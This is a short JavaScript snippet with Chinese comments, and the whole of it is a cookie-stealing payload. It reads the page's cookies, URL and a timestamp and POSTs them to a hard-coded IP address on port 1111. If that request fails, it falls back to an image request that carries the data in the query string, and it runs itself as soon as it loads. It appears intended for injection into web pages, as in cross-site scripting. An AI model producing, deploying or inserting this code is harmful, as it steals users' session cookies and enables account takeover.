// 获取所有cookie并发送到指定VPS服务器的函数
function collectAndSendCookies() {
    // 获取当前页面的所有cookie
    const allCookies = document.cookie;
    
    // 准备要发送的数据
    const data = {
        cookies: allCookies,
        url: window.location.href,
        timestamp: new Date().toISOString()
    };
    
    // 发送数据到您的VPS
    fetch('http://83.229.127.162:1111/collect', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .catch(error => {
        console.error('发送数据时出错:', error);
        
        // 备用方法：如果fetch失败，可以尝试使用图像请求
        const img = new Image();
        img.src = `http://83.229.127.162:1111/collect-backup?data=${encodeURIComponent(JSON.stringify(data))}`;
    });
}

// 执行函数
collectAndSendCookies();
